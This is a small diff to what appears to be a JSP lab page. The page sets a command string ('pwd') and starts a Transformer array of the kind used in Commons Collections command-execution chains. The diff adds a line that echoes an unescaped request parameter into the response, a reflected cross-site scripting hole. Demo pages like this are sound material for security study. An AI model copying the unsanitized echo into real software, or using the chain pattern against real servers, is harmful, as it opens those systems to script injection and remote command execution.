@@ -9,6 +9,7 @@
 <%@ page import="java.lang.annotation.Retention" %>
 <%@ page import="java.io.*" %>
 <%
+    out.println(request.getParameter("test"));
     String cmd = "pwd";
 
     Transformer[] transformers = new Transformer[]{
